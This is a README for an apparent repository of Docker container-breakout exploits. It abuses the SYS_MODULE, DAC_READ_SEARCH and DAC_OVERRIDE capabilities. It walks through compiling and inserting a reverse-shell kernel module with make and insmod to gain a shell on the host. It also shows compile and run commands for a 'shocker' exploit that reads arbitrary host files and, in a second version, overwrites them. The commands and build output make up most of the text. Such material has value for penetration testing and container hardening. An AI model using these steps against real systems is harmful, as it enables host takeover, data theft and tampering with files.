# Docker Exploits
This repository is made to store exploits associated to Docker. 

With this exploits, it is possible to abuse capabilities or misconfigurations to compromise and/or breakout Docker containers.



## Capabilities

### SYS_MODULE

This capability can be used by an attacker to insert a malicious module into the shared kernel (host <-> containers).

You can use the code available [here](./Capabilities/SYS_MODULE/reverse_shell.c) to create the module.

**Please open your listen port on your machine before insert the module on the kernel**

You can compile it using the `make` command and insert the obtained module using the `insmod` command on the container :

```bash
root@aku:/tmp# make
make -C /lib/modules/5.3.0-2-amd64/build M=/tmp modules
make[1] : on entre dans le répertoire « /usr/src/linux-headers-5.3.0-2-amd64 »
  CC [M]  /tmp/reverse_shell.o
[...]
  CC      /tmp/reverse_shell.mod.o
  LD [M]  /tmp/reverse_shell.ko
make[1] : on quitte le répertoire « /usr/src/linux-headers-5.3.0-2-amd64 »
root@aku:/tmp# insmod reverse_shell.ko
```

And you will get a shell on the host !

### DAC_READ_SEARCH

This capability can be used by an attacker to read sensitive files on the host.

You can use the exploit available [here](./Capabilities/DAC_READ_SEARCH/exploit_dac-read-search.c)

To compile it, use the following command 

```bash
gcc -Wall -std=c99 -O2 exploit_dac-read-search.c -static -o shocker
```

To use it, you need to define a host mounted file on the container with `mount` command. Please find a example below :

![image](https://i.imgur.com/dwEhbOH.png)

Launch the program with the following command :

```bash
./shocker <MOUNTED_FILE> <HOST_FILE_TO_READ>
```

Combined with the capability DAC_OVERRIDE, it is possible to rewrite sensitive files on the host.

You can use the program [here](./Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c). Compile it with the same command as before.

Use it with the following command :

```bash
./shocker_write <MOUNTED_FILE> <HOST_FILE_TO_REPLACE> <LOCAL_FILE_REPLACED_HOST>
```

